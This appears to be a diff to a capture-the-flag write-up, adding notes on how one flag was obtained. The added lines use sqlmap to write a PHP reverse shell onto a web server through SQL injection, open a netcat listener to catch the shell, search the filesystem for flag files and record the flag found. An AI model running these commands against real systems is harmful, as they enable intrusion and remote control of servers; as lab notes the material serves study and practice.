@@ -76,8 +76,13 @@ sqlmap -r albert.txt --dump  -T flags -D cuiteur
 ------------------------------------------------------------------------------------
 
 flag{3b2000}:
-used sqlmap to upload php-reversh-file
+used sqlmap to upload php-reverse-shell.php
+sqlmap -r albert.txt --file-write=./php-reverse-shell.php --file-dest=/var/www/html/php/reverse-shell.php
 
+nc -lvnp 2424
+ find / -type f -name flag{* 2>/dev/null
+
+/var/www/html/flag{3b2000b9c6cb4f72bdea7affa125b875113ab85283e8ea}.jpg
 
 
 
